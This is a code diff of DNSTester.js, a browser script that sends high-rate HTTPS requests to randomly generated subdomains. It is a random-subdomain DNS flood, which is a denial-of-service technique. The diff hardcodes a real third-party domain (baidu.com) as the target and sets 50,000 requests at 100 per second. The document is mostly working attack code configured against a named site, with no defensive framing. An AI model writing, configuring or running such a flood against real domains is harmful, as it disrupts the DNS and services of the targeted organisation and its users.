@@ -1,5 +1,5 @@
 /*!
- * DNSTester.js 0.0.351
+ * DNSTester.js 0.0.35
  * https://github.com/cnbeining/DNSTester.js
  * http://www.cnbeining.com/
  *
@@ -13,10 +13,10 @@
  */
 var COUNT = 0;
 var STARTTIME = (new Date).getTime();
-var DOMAIN; //Change me in caller
-var MAX_COUNT;  //Change me in caller
-var TPS;  //Change me in caller
-var TIMERID; //To stop the test
+var DOMAIN = ".baidu.com/"; //Change me in caller
+var MAX_COUNT = 50000;  //Change me in caller
+var TPS = 100;  //Change me in caller
+var TIMERID = 0; //To stop the test
 function makeid_old(length)
 {
     var text = "";
@@ -41,11 +41,11 @@ catch(err) {
     makeid = makeid_old;
 }
 function r_send2() {
-    if (MAX_COUNT >= 1 && COUNT <= MAX_COUNT) {
-        get("https://" + makeid(Math.floor((Math.random() * 64) + 1)) + DOMAIN) // NEVER FORGET, in case you use HTTPS
+    if ((MAX_COUNT < 1 || COUNT >= MAX_COUNT) != true) {
+          get("https://" + makeid(Math.floor((Math.random() * 64) + 1)) + DOMAIN) // NEVER FORGET, in case you use HTTPS
       };
     if (COUNT % 1000 == 0) { //report every 1000 times
-        console.log('Done: ' + COUNT.toString())
+          console.log('Done: ' + COUNT.toString())
       };
 }
 function get(a) {
